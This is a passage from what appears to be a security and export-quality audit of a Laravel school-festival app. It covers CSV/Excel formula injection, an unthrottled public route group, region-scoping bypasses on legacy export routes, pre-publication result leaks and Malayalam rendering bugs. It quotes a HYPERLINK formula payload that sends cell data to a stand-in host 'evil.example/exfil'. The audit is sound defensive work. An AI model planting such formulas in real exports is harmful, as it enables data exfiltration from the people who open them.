| SEC-04[SecAudit] | security issue | P3 | The shared `publicWinnerRow()` formatter has no internal `results_published` gate; 3 callers each independently remember to gate it externally today |
| SEC-05[SecAudit] | not a gap (confirmatory) | P3 | `app/_to_delete/FestReportPolicy.php` is genuinely dead code — zero call sites, no policy-registration mechanism exists at all in this app |

### SEC-01[SecAudit] — CSV/Excel formula injection across the whole export layer
**Classification:** security issue · **P1**

**Expected:** Any exported cell value beginning with `=`, `+`, `-`, or `@` must be neutralized before being written, since Excel/Sheets/LibreOffice parse a leading such character as a live formula the instant the file opens (CWE-1236).

**Actual:** None of the Fest module's spreadsheet/CSV writers neutralize formula-trigger characters:
1. **`App\Support\ExcelExport::spreadsheetXml()`** (`app/Support/ExcelExport.php:34-64`, full file re-read, independently confirmed) — its only escaping is `htmlspecialchars($value, ENT_XML1|ENT_QUOTES, 'UTF-8')`, applied to every cell. This one function backs ~20+ export call sites across `FestExportService`, `FestSchoolReportExportService`, `FestReportService`, `FestEventReportAnalyticsService`.
2. Raw `fputcsv()` with zero formula-escaping in `FestEventFeesController::exportPayments` (`transaction_ref` written unescaped, :357), `FestRegistrationRegisterService::exportCsv` (:189-228), and the shared `CsvExportDispatcher::streamDownload` (:67-81).
3. Hand-built CSV string concatenation with **no** quote- or formula-escaping in `FestReportService::clashesCsv`/`itemScheduleCsv`/`promotionsCsv` (:1171-1258).

Entry points `Student.name` (`required|string|max:255`) and `FeeReceipt.transaction_ref`/payment `transaction_ref` (`required|string|max:100`) both carry zero character restriction — either is directly plantable by a school-level actor.

**Evidence:** All cited files/lines re-read in full and confirmed. A pre-existing, git-tracked scratch test (`tests/Feature/Events/ScratchFormulaInjectionAuditTest.php`, committed in `ee246f53`) was re-run: raw CSV output captured `"=HYPERLINK(""https://evil.example/exfil?x=""&A1,""Click for receipt"")"` — the leading `=` inside the RFC4180-quoted cell is completely unneutralized; once a spreadsheet app dequotes the cell on open, it still begins with `=` and is parsed as a live formula. **This exact reproduction was repeated fresh, from scratch, by this pass** — see §7.2, row 7: the identical payload, byte-for-byte.

**Impact:** The planter (school-level data entry) is lower-trust than the consumer (Sahodaya/state admin opening the export) — a classic privilege-crossing CSV-injection attack. Realistic payloads can exfiltrate data (`HYPERLINK`/`WEBSERVICE`-style formulas), phish via a disguised clickable cell, or, on legacy Excel/DDE configurations, achieve local command execution. The pattern repeats across dozens of export methods spanning registrations, results, attendance, fees, certificates, catering, and audit-log exports.

**Recommendation:** Add one shared `neutralizeFormulaCell($value)` helper (OWASP guidance: prefix a leading `=`, `+`, `-`, `@`, tab, or CR with an apostrophe) and apply it inside `ExcelExport::spreadsheetXml()`'s escape closure and every `fputcsv()`/manual-CSV call site listed above.

### SEC-02[SecAudit] — No rate limiting on the public Fest portal route group
**Classification:** security issue · **P2**

**Expected:** Publicly reachable, database-query-driven or rendering-heavy endpoints should be rate-limited, matching every sibling public route group in the same file.

**Actual:** `routes/tenant.php`'s `Route::prefix('fest')->name('tenant.fest.')` group (15 GET routes: index, show, schedule, results, item-schedule, item-results, item-results.pdf, winner-poster, scoreboard, manual, live, live/data, records, search, participant) carries **no** throttle middleware anywhere — the only public group in the file without one. Siblings all opt in: impersonate/consume (`throttle:10,1`), school-register store (`throttle:10,1`), training register/attendance (`throttle:20,1`/`30,1`), academic-results (`throttle:60,1` on the whole group). Laravel's own default `web` middleware group carries no implicit throttle either (confirmed by reading the framework's own `Middleware.php`).

**Evidence:** `routes/tenant.php:20-25` (outer group, no throttle), `:70-86` (fest group, all 15 routes, none throttled) — **independently re-confirmed during this pass**, see the code excerpt captured directly from the file. `FestPortalController.php:568-622` (`search()`/`participant()`) accept unlimited-rate chest-number/level-registration-number lookups; `FestPublicVisibilityService.php:41-79` confirms names/marks are correctly withheld pre-publication, but `formatPublicParticipant()` always returns `reference`/`link_ref`/`item_title` regardless of publication state, so unlimited-rate enumeration still maps which chest/level-reg numbers exist pre-publication.

**Impact:** An attacker can enumerate the full chest-number/level-reg-number space at unlimited speed pre-publication, and fully scrape names+schools+marks for every participant within seconds of `results_published` flipping true. The same missing throttle exposes `itemResultsPdf` (DomPDF rendering), `winnerPoster` (SVG rendering), and `live/data` (DB aggregation) to unlimited-rate resource-exhaustion from one unauthenticated client.

**Recommendation:** Apply `throttle:X,1` to the `Route::prefix('fest')` group, sized similarly to the neighboring `academic-results` group (`throttle:60,1`) or tighter for search/participant specifically.

### SEC-03[SecAudit] — No `$guarded` backstop on `FestEvent`/`FestSchoolEventFee`
**Classification:** security issue · **P3**

**Expected:** A model exposing tenant-identity and workflow/financial control columns through `$fillable` should carry a `$guarded` backstop so a future or overlooked call site passing broader request data into `create()`/`update()`/`fill()` cannot silently reassign a `FestEvent`'s tenant or flip publication/lock state.

**Actual:** `FestEvent::$fillable` includes `tenant_id`, `results_published`, `scoring_locked`, `registration_locked`, `appeals_open`, `schedule_published`, `region_id`, `parent_event_id`, `root_event_id`, `state_program_id`. `FestSchoolEventFee::$fillable` includes `status`, `amount_paid`, `total_due`, `override_amount`. Neither declares `$guarded`. Every current create/update call site uses an explicit `validate()` allow-list or hardcoded literal arrays, and `tenant_id` specifically is force-set server-side after validation in both the SahodayaAdmin and lower-privileged SchoolAdmin creation paths — **no live exploitable call site was found**. Independent additional greps this pass ran beyond the source finding (`request()->all()`/`$request->all()` into either model, `->fill(` on either model) also return zero hits.

**Impact:** Not proven exploitable today — a defense-in-depth gap, not a confirmed live bug. The safety net is 100% procedural: one future `$event->update($request->all())`-style shortcut, or a new endpoint added without the same discipline, would immediately become exploitable.

**Recommendation:** Add `protected $guarded = ['id', 'tenant_id'];`-style protection (or drop `tenant_id` from `$fillable`) on `FestEvent`; consider the same for `status`/`amount_paid`/`total_due` on `FestSchoolEventFee`.

### SEC-04[SecAudit] — Shared public-results formatter has no internal gate
**Classification:** security issue · **P3**

**Expected:** Any shared row-formatter that can expose a participant's name/school/position/grade/score should itself refuse to reveal them before publication, the way `FestPublicVisibilityService::formatPublicParticipant()` correctly does internally.

**Actual:** `FestPortalController::publicWinnerRow()` (:543-554) returns raw name/school/position/grade/score/measurement unconditionally, with no `results_published` check inside it. All 3 current call sites gate correctly **today**, but via 3 different, independently-maintained mechanisms: `results()` calls `abort_unless(...results_published..., 404)` before the query; `scoreboard()`'s query is forced empty via `->when(!$isPublished, fn($q)=>$q->whereRaw('1=0'))`; `winnerPoster()` has its own `abort_unless`. `itemResults()` doesn't even call `publicWinnerRow()` — it inlines an equivalent, separately-gated field array.

**Impact:** Currently correct, but architecturally fragile: a future edit to any one of the 3 existing guards, or a new caller added without its own external gate, would silently and immediately leak pre-publication names/schools/positions/scores on a fully public page.

**Recommendation:** Move the `results_published` check inside `publicWinnerRow()` itself (mirroring `formatPublicParticipant()`'s internal field-level gating), and route `itemResults()`'s inline row-building through the same helper.

### SEC-05[SecAudit] — `app/_to_delete/FestReportPolicy.php` is genuinely dead code (confirmatory)
**Classification:** not a gap (confirmatory) · **P3**

**Actual:** Confirmed: this 90-line file (namespace `App\Policies`) has zero call sites anywhere outside itself, and there is **no policy-registration mechanism of any kind active in this app** — no `$policies` array anywhere (not even an empty one; `AppServiceProvider.php:15` is actually an unrelated `use Stancl\Tenancy\DatabaseConfig;` import, correcting the source finding's own mis-citation), no `Gate::policy()`/`Gate::define()` call anywhere, and no `App\Models\FestReport` model exists for Laravel's naming-convention auto-discovery to bind to either. It is genuinely orphaned, exactly as its own docblock claims ("PERM-01 ... DEAD CODE ... Safe to delete outright"). It *is* technically autoloadable (`composer.json`'s PSR-4 map covers `app/_to_delete/` too), just entirely unwired. **Independently re-confirmed in this pass** — the file, its docblock, and the absence of any `$policies`/`Gate::policy` registration were all directly re-read.

**Recommendation:** Delete `app/_to_delete/FestReportPolicy.php` outright. Its logic has not been kept in sync with the real authorization path's own documented fixes (`EventRegionAdminScope::matchesRegionScope()`'s "gap G1" fix) — if a future developer wires it up believing it's live, it would silently reintroduce an already-fixed containment gap. *(This exact investigation was independently re-run by a second sub-audit pass under `TECH-01[Lifecycle]`, §4 — both reach the identical conclusion.)*

---

## 4. Report lifecycle and visibility gating

*(Whether the app's publication-state flags — `results_published`, `schedule_published`, `phase_mode_enabled` — actually control what scoped and public actors can see, end-to-end, on every route that serves the data, not just the primary one.)*

| Finding | Classification | Severity | One-line |
|---|---|---|---|
| SEC-01[Lifecycle] | security issue | **P0** | 4 legacy export routes (registrations/results/attendance/fees) skip region-scoping middleware entirely — region_admin gets every region's data. Empirically proven live. |
| SEC-02[Lifecycle] | security issue | **P1** | Athletic records + live/records pages check only `record_tracking_enabled`, never `results_published`/`schedule_published` — names+marks leak pre-publication |
| SEC-05[Lifecycle] | security issue | **P1** | No code anywhere is aware of `phase_mode_enabled` for public visibility — publishing any one phase exposes every phase's marks event-wide |
| SEC-06[Lifecycle] | broken workflow | P2 | The event-wide lifecycle gate 403s before the phase-specific carve-out check ever runs, blocking a documented, legitimate early per-phase export workflow |
| SEC-03[Lifecycle] | security issue | P2 | The legacy `export.results` route has zero `EventLifecycleGate`/`allowResultReport()` call — pre-publish results reachable, compounding `SEC-01[Lifecycle]` |
| SEC-04[Lifecycle] | data-integrity issue | P2 | Unpublishing results never revokes downstream `FestQualification` rows — the state-level winners page keeps showing retracted qualifications |
| TECH-01[Lifecycle] | not a gap (confirmatory) | P3 | Independent re-confirmation of `SEC-05[SecAudit]`: `_to_delete/FestReportPolicy.php` is dead, unwired code |
| POS-01 | not a gap (confirmatory) | P3 | Cross-Sahodaya, cross-school, and state-level access boundaries are all correctly and redundantly enforced at the middleware layer |

### SEC-01[Lifecycle] — Region containment fails on 4 legacy export routes (P0, empirically proven)
**Classification:** security issue · **Severity: P0** · **Actor:** Sahodaya region_admin

**Expected:** Per the codebase's own documented Phase-1 exit criterion (`ResolveRegionScopedReportEvent.php:28`, quoted verbatim): *"Region A admin receives no Region B sentinel data from any parent, child, preview, or export URL."*

**Actual:** `FestExportController`'s four methods (`registrations`, `results`, `attendance`, `fees`) each only check same-tenant membership and then call `FestExportService`, whose methods query `whereIn('event_id', $event->reportableEventIds())` — which on a hub expands to **every** child+grandchild event, i.e. every region. These 4 routes sit inside the same route group as the properly region-scoped `/reports/*` routes but are declared **before** (outside) the `region.report.scope` middleware group that narrows a region-locked admin's hub request to their own region. `EnsureSahodayaAdmin` legitimately lets the request through in the first place (a region_admin assigned on the hub with a non-null `region_id` is an intentionally-allowed shape — the documented "gap G1" fix), so the request reaches the controller with **zero further narrowing**.

**Evidence:** A throwaway PHPUnit test (`tests/Feature/SahodayaAdmin/ZZScratchVerifySec01Test.php`, written, run, deleted — `git status --short` confirmed clean afterward) independently re-implemented the two-region sentinel-fixture pattern the project's own `RegionAdminReportContainmentTest` uses. A region_admin assigned only to Region A, hitting the already-fixed sibling route (`reports.index`), correctly saw only Region A (200, contained). The same actor hitting `export.results`/`export.registrations`/`export.fees`/`export.attendance` all returned 200 **including Region B's sentinel data** — `export.registrations contains A=YES B=YES-LEAK`. Full run: `{"result":"passed","tests":1,"passed":1,"assertions":2,"duration_ms":2068}`. File-level citations re-confirmed: `FestExportController.php` (38 lines, only an `abort_if` tenant check); `FestEvent.php:399-413` (`reportableEventIds()`); `routes/web.php:1260-1263` (the 4 export routes) vs. `:1366` (`region.report.scope` group start); `bootstrap/app.php:65` (`region.report.scope` → `ResolveRegionScopedReportEvent::class`).

**Impact:** Direct violation of the region-containment guarantee the product explicitly built, tested, and documented for the sibling report routes. Sahodaya regions are often run by different local coordinators with competitive sensitivities around standings and results — a real reputational/trust exposure. These 4 routes are not linked from the current Vue frontend, but the raw URLs are live, guessable (same shape as every other event-scoped route), and reachable today by anyone holding region_admin credentials on the hub.

**Recommendation:** Delete `FestExportController` and its 4 routes now that the catalog's equivalent export ids are served safely through `FestReportController::export()`, or wrap the 4 routes in the same `region.report.scope` middleware and rewrite `FestExportService`'s methods to accept and honor a `FestReportScope`.

### SEC-02[Lifecycle] — Athletic records and live pages leak names/marks pre-publication
**Classification:** security issue · **P1** · **Actor:** Public / anonymous site visitor

**Expected:** Per `FestPublicVisibilityService`'s own design (chest-number anonymity, names/marks hidden until `results_published`) and every sibling public method's pattern, no participant name or measurement tied to an in-progress/unpublished event should reach an unauthenticated visitor.

**Actual:** `publicAthleticRecords()` and `recentRecordBreaks()` check **only** `$event->record_tracking_enabled` — no `results_published` check anywhere — unlike every sibling public method (`results`, `itemResults`, `winnerPoster`, `itemResultsPdf`, `schedule`), which all correctly gate first. `records()` (the controller action reaching them) has zero lifecycle check at all. `FestMarkSaveService::save()` calls `FestAthleticRecordService::evaluateMark()` unconditionally on every mark save, which writes `FestAthleticRecord`/`FestRecordBreak` rows immediately — that service has zero `results_published` references anywhere. `live()`/`liveData()`'s `livePayload()` also queries raw `FestSchedule` rows with no `schedule_published` check, unlike the dedicated `schedule()` action. The whole `/fest` route group has no auth middleware.

**Evidence:** Full read of `FestPortalController.php` (719 lines): `publicAthleticRecords()`/`recentRecordBreaks()` at :676-718 check only `record_tracking_enabled` (:678,700); `records()` at :556-566 has no lifecycle check; `livePayload()` at :497-540 calls both unconditionally and queries `$nowSlot` (:511-516) with no `schedule_published` check. `FestAthleticRecordService.php` (185 lines) — zero `results_published` references, creates `FestAthleticRecord` (:47, `holder_name` at :55) and `FestRecordBreak` (:71) unconditionally. `record_tracking_enabled` defaults false but is a real, admin-settable toggle.

**Impact:** Breaks the chest-number-anonymity-until-reveal pattern the rest of the public portal is built around, with no admin action required beyond a judge entering a qualifying mark.

**Recommendation:** Gate `publicAthleticRecords()`/`recentRecordBreaks()` on the same `rootResultsAvailable($event)` check `itemResults()`/`itemResultsPdf()` already use; gate `livePayload()`'s `$nowSlot` on `schedule_published`.

### SEC-05[Lifecycle] — No code anywhere is phase-aware for public visibility
**Classification:** security issue · **P1** · **Actor:** Public site visitor + Sahodaya admin/staff (report export)

**Expected:** Per the codebase's own remediation plan, publishing one competition phase of a `phase_mode_enabled` event should not expose another, unpublished phase's marks.

**Actual:** None of the public-visibility code (`FestPublicVisibilityService`, `FestPortalController`, `PublicFestScoreboardService`) has any concept of `phase_mode_enabled` or per-item competition phase (`grep -c phase_mode_enabled` = 0 across all three). `EventLifecycleGate::currentReportPhase()`/`allowedReportPhases()` key purely on event-wide `results_published`/`schedule_published`/`status`. The only phase-aware publication mechanism that exists (`FestPhasePublicationService`) is explicitly restricted to the structurally distinct phased-regional-billing mechanism (`abort_unless($leaf->usesPhasedRegionalBilling()...)`) and refuses to run otherwise. So for a `phase_mode_enabled` event, there is exactly one on/off switch (`results_published`) covering every item regardless of phase.

**Evidence:** `EventLifecycleGate.php:96-119`; `FestPublicVisibilityService.php:52-94`; `FestPhasePublicationService.php:81`; `docs/REGION_PHASE_EVENT_REPORTING_REMEDIATION_PLAN.md` — independently re-located and confirmed to exist as cited — line 63: *"G7 | fest_event_phases lifecycle columns and phase_mode_enabled exist, but registration, food, scheduling, marks, results, certificates, promotion, reports, and public pages do not enforce them. | Named phases are labels only."* Its "Phase 6 — Named phase operational gates and reports" section (:728-740) is listed as future/unexecuted work. This directly reconfirms AUDIT_02's own PHASE-03 finding.

**Impact:** Breaks the phase-by-phase reveal model a `phase_mode_enabled` event is presumably configured for — a known, documented, still-open gap (G7) per the codebase's own remediation plan.

**Recommendation:** Extend `FestPublicVisibilityService`/`PublicFestScoreboardService`/`FestPortalController`'s query scoping to check each item's own competition-phase `results_published` state via `FestPhaseLifecycleService::effectiveLifecycleForItem()` when `phase_mode_enabled` is true, per the plan's own Phase 6 scope.

### SEC-06[Lifecycle] — Phase-scoped export is blocked by the wrong-order lifecycle check
**Classification:** broken workflow · **P2** · **Actor:** Sahodaya admin/event/region-admin staff

**Expected:** Per the docblock at `FestReportController.php:848-861`, a `phase_mode_enabled` event's after-phase export for one already-published phase should become available once that phase (not the whole event) is published.

**Actual:** The coarse, event-wide `enforceReportLifecyclePhase()` call runs **unconditionally before** the finer, phase-specific carve-out check, and 403s the request before the carve-out is ever reached — because `allowedReportPhases()` only includes `'after'` once the event-wide `results_published` is true, exactly the scenario the carve-out exists to handle.

**Evidence:** `FestReportController.php:846` (`enforceReportLifecyclePhase()`, unconditional) vs. `:853-861` (the phase-specific `if ($phase === 'after' && $event->phase_mode_enabled && ...)` check, unreachable in this scenario); `EventLifecycleGate.php:121-128`; `FestReportCatalog.php:104` (the `results` export's catalog phase is literally `'after'`). This precisely reconfirms AUDIT_02's PHASE-03 finding.

**Impact:** Blocks a legitimate, code-documented workflow (early per-phase report access) for staff running `phase_mode_enabled` events.

**Recommendation:** Evaluate the phase-specific check before the event-wide `enforceReportLifecyclePhase()` call, or teach `allowedReportPhases()` to accept an optional `competition_phase_id`.

### SEC-03[Lifecycle] — Legacy `export.results` has zero lifecycle gate
**Classification:** security issue · **P2** · **Actor:** Sahodaya admin/event/region-admin staff (legacy export route)

**Expected:** Per `EventLifecycleGate::allowResultReport()`'s own stated rule ("Result reports are available only after results are published"), a results export should be unavailable pre-publish regardless of endpoint.

**Actual:** `FestExportController::results()` calls `FestExportService::results()` directly with **zero** lifecycle check anywhere in the controller (`grep` for `EventLifecycleGate` across the whole 38-line file returns zero matches), while the parallel catalog-driven path calls both `allowReportExport()` and `allowResultReport()` for the same conceptual report before serving it. `allowResultReport()` has exactly 2 real call sites in the whole app — neither is `FestExportController`.

**Evidence:** `FestReportService.php:378-379`; `EventLifecycleGate.php:227-234`; `FestReportCatalog.php:88`.

**Impact:** Combined with `SEC-01[Lifecycle]`, an out-of-region actor reaching this route gets both the authorization bypass and the lifecycle bypass simultaneously — full unpublished, cross-region results in one request.

**Recommendation:** Add `EventLifecycleGate::allowResultReport($event, 'results')` to `FestExportController`'s methods, or retire the controller per `SEC-01[Lifecycle]`'s recommendation.

### SEC-04[Lifecycle] — Unpublishing results never revokes downstream qualifications
**Classification:** data-integrity issue · **P2** · **Actor:** State admin / state staff

**Expected:** Once a Sahodaya unpublishes an event's results, downstream artifacts derived from those results — including qualifications already promoted to the state level — should stop being presented as current, or be reconciled with the retraction.

**Actual:** `unpublish()` (both its phased-regional-billing and plain branches) flips `results_published` back to false and cascades to children/`FestResult` rows, but never calls `FestQualificationService::revokeQualification()` anywhere. `KalotsavStateController::collectWinnerRows()` reads `FestQualification` rows directly with only a state-ownership check, never re-checking the source event's current `results_published` state. *Broader gap than originally framed:* `FestQualificationService::promoteWinners()`'s `results_published` guard is **not universal** — it sits inside `if ($fromEvent->usesPhasedRegionalBilling())` only, so for a plain/non-phased event, `promoteWinners()` has **no** `results_published` check at all; qualifications could be created even before results are ever first published.

**Evidence:** `FestResultsController.php:269-318` (`unpublish()`, both branches, zero `FestQualification` code); `grep -rn "observe(" app/Providers/*.php` confirms no `FestEvent` observer exists; `KalotsavStateController.php:92,103,130,94,105,179`.

**Impact:** State-level staff make decisions (or publish onward) based on qualification data the originating Sahodaya has explicitly retracted, with no signal anywhere that the source was unpublished.

**Recommendation:** Call `revokeQualification()` for affected qualifications from `unpublish()`/`FestPhasePublicationService::unpublishResults()`, or have `collectWinnerRows()` cross-check the live `results_published` flag of each source event.

### TECH-01[Lifecycle] — Independent re-confirmation of the dead policy file (confirmatory)
**Classification:** not a gap (confirmatory) · **P3**

**Actual:** A second, independent sub-audit pass reached the identical conclusion as `SEC-05[SecAudit]` (§3) via a separate investigation path: `app/_to_delete/FestReportPolicy.php` is genuinely orphaned and inert. This pass additionally confirmed the sibling `app/_to_delete/RegionScope.php` (middleware) is equally dead — corroborated independently by `UserRegionAssignment.php`'s own docblock — and recommends deleting the whole `_to_delete` directory, not just the policy file.

**Recommendation:** Delete `app/_to_delete/FestReportPolicy.php` and `app/_to_delete/RegionScope.php` outright, per both passes' independent conclusion. See §3 (`SEC-05[SecAudit]`) for the full evidence trail.

### POS-01 — Cross-Sahodaya, cross-school, and state-level boundaries are correctly enforced (confirmatory)
**Classification:** not a gap (confirmatory) · **P3** · **Actor:** Cross-Sahodaya / cross-school / state-level actors

**Actual:** All three properties confirmed correctly and redundantly enforced at the **middleware layer**, independent of and prior to controller/query logic — the positive counterpart to `SEC-01[Lifecycle]`'s narrower, one-level-down region-vs-region gap inside a single Sahodaya:
- **Cross-Sahodaya:** `EnsureSahodayaAdmin.php:34-37` aborts 403 the instant `$user->tenant_id !== $request->route('tenantId')` (superadmin excepted by design).
- **Cross-school:** `EnsureSchoolAdmin.php:34-38` applies the identical check; `FestSchoolReportController.php:1457-1460` additionally hard-overrides any request-supplied `school_id` with `$this->school->id` before every export.
- **State-level:** `routes/web.php:79` wraps every cross-Sahodaya state-aggregation route in `state.admin` → `EnsureStateAdmin`, which requires `state_admin`/`state_staff` and **fails closed** for a state user with no assigned `state_id` ("gets null, which every scoped query below treats as see nothing").

**Recommendation:** No action required; keep as regression-test-worthy invariants. Recommend extending the existing `RegionAdminReportContainmentTest` pattern with explicit Sahodaya-to-Sahodaya and school-to-school HTTP-level tests as hardening, not a bug fix.

---

## 5. Export quality

| Finding | Classification | Severity | One-line |
|---|---|---|---|
| EXP-01 | confirmed bug | **P1** | All 30/30 Fest report PDF views use Latin-only font stacks; DejaVu Sans has 0/128 Malayalam codepoints — names render as tofu boxes |
| EXP-02 | security issue | P2 | Same CSV/Excel formula-injection class as §3's `SEC-01[SecAudit]`, reproduced end-to-end via the live fees-export route |
| EXP-03 | test gap | P2 | Zero tests anywhere in the suite contain literal Malayalam-script text; a keyword-grep methodology in the original claim has a false-positive |
| EXP-04 | data-integrity issue | P2 | No hand-rolled CSV export writes a UTF-8 BOM — Malayalam text mojibakes when double-clicked open in Windows Excel |
| EXP-05 | performance risk | P2 | Zero use of `chunk()`/`cursor()`/`lazy()` anywhere in Fest export/report code; `ExcelExport` builds one full XML string in memory before streaming |
| EXP-06 | performance risk | P2 | Only 2 of many memory/time-heavy export methods bump PHP limits; no queued/async fallback exists for CSV/Excel/PDF in this module |
| EXP-07 | report mismatch | P3 | Files download as `.xls`/`application/vnd.ms-excel` but are hand-built SpreadsheetML XML text, not real binary XLS — triggers an Excel open-time warning |
| EXP-08 | report mismatch | P3 | Item Registration Counts PDF shows a totals row; the Excel version of the identical report does not |
| EXP-09 | UI/navigation gap | P3 | 20 of 30 report Blade views use plain `@foreach` with no `@empty` branch — a zero-row report renders a silently blank table |

### EXP-01 — Malayalam names render as empty boxes in every Fest PDF report
**Classification:** confirmed bug · **P1** · **Actor:** Sahodaya admin / School admin (any PDF report consumer)

**Expected:** Malayalam-script student/teacher/school names — a routine data type for a Kerala inter-school festival system — should render as legible text in exported PDFs.

**Actual:** All 30/30 Fest report PDF Blade views use Latin-only font stacks (28 use `'DejaVu Sans'`; the remaining 2 use `'Helvetica Neue', Helvetica, Arial, sans-serif` — also Latin-only). A from-scratch TTF cmap parser run against `vendor/dompdf/dompdf/lib/fonts/DejaVuSans.ttf` found **0/128** Malayalam codepoints (U+0D00–U+0D7F) present — all 6 sample chars (അകമലയം) missing — cross-validated against a known-good control (Cyrillic: 256/256 present) and a negative control (Devanagari, a different Indic script: also 0/128, consistent with DejaVu Sans genuinely lacking Brahmic-script glyphs). A fresh, independent end-to-end reproduction (Dompdf render → `pdftoppm` PNG, script/PDF/PNG deleted after use) visually confirmed Latin text rendered correctly while Malayalam rendered as tofu boxes for every character — and confirmed `pdftotext` on the same file **does** recover the correct Malayalam Unicode via the embedded ToUnicode CMap even though nothing visually rendered, independently proving that a `pdftotext`-only regression test would give a false pass.

**Evidence:** `vendor/dompdf/dompdf/lib/fonts/DejaVuSans.ttf` (own cmap parse); `resources/views/fest/reports/*.blade.php` (28/30 `'DejaVu Sans'`, 2/30 Helvetica/Arial — all 30/30 Latin-only); `app/Support/PdfGenerator.php:41-86` (dompdf fallback path, triggers whenever `PDF_CONVERTER_URL` is empty) and full-file confirmation of **zero** `Log::` calls anywhere — the fallback is genuinely silent.

**Impact:** Any environment relying on the built-in dompdf fallback — the documented local-dev path, and the silent behavior in production if the external Chromium converter is ever unset, misconfigured, or transiently unreachable — produces attendance sheets, admit cards, mark-entry sheets, and registration lists with unreadable names, i.e. documents meant for identity verification at a live event. Whether the external Chromium service has Malayalam fonts installed is unconfirmed from this repo, so production correctness for that path remains unverified, not assumed-fine.

**Recommendation:** Register a Malayalam-capable Unicode font (Noto Sans Malayalam or Meera) with dompdf and reference it in the report stylesheets' font-family fallback chain; verify dompdf's actual glyph-fallback behavior directly rather than assuming CSS `font-family` lists behave like a browser. Make the `PDF_CONVERTER_URL` fallback loud (log a warning, or fail closed) instead of silently degrading.

### EXP-02 — CSV/Excel formula injection, reproduced via the live fees-export route
**Classification:** security issue · **P2** · **Actor:** Sahodaya admin (victim); School admin (attacker-reachable input)

**Actual:** This is the same underlying vulnerability class as `SEC-01[SecAudit]` (§3), independently re-confirmed by re-reading `ExcelExport.php` in full and re-running the sibling scratch test against a raw-`fputcsv`-based route (`FestEventFeesController::exportPayments`) rather than the `ExcelExport` XML path. The test's own strict-equality assertions technically fail — but only because `fputcsv` RFC4180-quotes the whole field and doubles internal literal `"` characters, routine CSV quoting, not a security fix. The raw bytes are unambiguous: `"=HYPERLINK(""https://evil.example/exfil?x=""&A1,...)"`  — once dequoted by any spreadsheet app, the cell still begins with `=` with no neutralizing prefix. *Note on the test file's provenance:* it is git-committed (in `ee246f53`), not an ephemeral scratch artifact — this pass left it untouched accordingly, matching the constraint against modifying source/tracked files without instruction.

**Recommendation:** Same shared `neutralizeFormulaCell()` helper as `SEC-01[SecAudit]`, applied centrally rather than patched per call site. Fix the existing test's assertion style to compare the *decoded* cell value, not a raw substring match, so it correctly asserts pass/fail on neutralization itself.

**Regression test:** Unit test on `ExcelExport::spreadsheetXml()` asserting a `'='`-prefixed value is neutralized in the emitted XML/CSV.

### EXP-03 — Zero Malayalam-script text anywhere in the test suite
**Classification:** test gap · **P2**

**Expected:** Given the app's Malayalam-speaking user base and `EXP-01`, at least one export/report test should assert Malayalam-script names survive PDF/CSV/Excel export correctly.

**Actual:** A **methodology correction** on the original claim: one of its own cited files, `tests/Feature/SchoolAdmin/BoardResultsControllerTest.php`, actually has 6 keyword hits for "Malayalam" — but every hit is the English word used as a school-**subject** name in unrelated board-exam topper-marks tests (`'subject' => 'Malayalam'`), not Malayalam script and unrelated to Fest export rendering. So the "0 hits anywhere" claim, checked by literal keyword grep, has a false-positive baked in. A **stronger** check run this pass — `grep -rlP '[\x{0D00}-\x{0D7F}]' tests/` (the actual Malayalam Unicode block, not a keyword) — returns **zero** files anywhere in the entire `tests/` directory: no test in the whole suite contains any literal Malayalam-script text at all. No `FestExportService`- or `ExcelExport`-specific test file exists either.

**Impact:** Given `EXP-01`, this is not a theoretical gap — the untested scenario is actually broken in production-adjacent (dompdf-fallback) configurations.

**Recommendation:** Add a fixture student/school with a Malayalam name to at least one PDF export test and one CSV/Excel test, asserting round-trip correctness. Per `EXP-01`, a PDF assertion must check actual glyph rendering (rendered-image diff, or embedded-font cmap check), not `pdftotext`-extracted text.

### EXP-04 — No UTF-8 BOM on hand-rolled CSV exports
**Classification:** data-integrity issue · **P2** · **Actor:** Sahodaya admin / School admin

**Expected:** CSV exports containing non-ASCII text should be prefixed with a UTF-8 BOM (`\xEF\xBB\xBF`) so Microsoft Excel — the default handler for a downloaded `.csv` on the overwhelming majority of school-office Windows machines — correctly auto-detects UTF-8 instead of misreading it as the system ANSI codepage.

**Actual:** `FestReportService::clashesCsv()/itemScheduleCsv()/promotionsCsv()` (:1171-1256) build `$csv` as a manual string starting directly with the header row, `print($csv)` inside `streamDownload` — zero BOM anywhere. `FestSchoolReportController::exportStudentWise/exportTeacherWise/exportItemWise/exportParticipation/exportQualifiers` (5 methods, :435-601) all use `fopen('php://output','w')` → `fputcsv()`, each carrying a student/teacher/participant name field — zero BOM written before the header row, in any of them.

**Repro:** Export "Student wise" (or clashes/item-schedule/promotions) for an event containing a Malayalam student name; double-click the downloaded `.csv` to open directly in Excel on Windows — Malayalam characters display as mojibake.

**Impact:** Independent of `EXP-01`'s PDF/font issue — even with PDF rendering fixed, CSV exports of the same data would still corrupt Malayalam text for the most common real-world open method.

**Recommendation:** Prepend `"\xEF\xBB\xBF"` before the first byte of every hand-rolled CSV response. Centralize CSV generation through one shared helper — this pattern is currently duplicated independently across ~8 call sites.

### EXP-05 — No chunking anywhere in the export layer; full XML built in memory
**Classification:** performance risk · **P2**

**Actual:** `grep -rn "->chunk(\|->cursor(\|->lazy(\|LazyCollection" app/Services/Events/*.php app/Services/Reports/*.php app/Http/Controllers/SahodayaAdmin/Fest*.php app/Http/Controllers/SchoolAdmin/Fest*.php` returns **zero** matches. `FestExportService.php` has exactly 7 `->get()` calls. `ExcelExport::download()` streams via a single `print()` of the entire XML document, which `spreadsheetXml()` builds via repeated string concatenation of the complete document **before** that one `print()` call — so `response()->streamDownload()` only streams the already-fully-materialized bytes; the underlying data generation is not chunked at all.

**Impact:** For a Sahodaya-wide multi-school Kalolsavam (the app's own stated real-world domain), a "results" or "registrations" export across a whole event holds the full row set **plus** a full duplicate XML-string representation in one PHP worker's memory simultaneously, with no fallback if that exceeds `memory_limit`.

**Recommendation:** Use `->cursor()`/`->lazy()` for the feeding queries; rewrite `ExcelExport::spreadsheetXml()` to yield/write XML chunks incrementally instead of building one complete string first.

### EXP-06 — No memory/time budget or async fallback for heavy exports
**Classification:** performance risk · **P2**

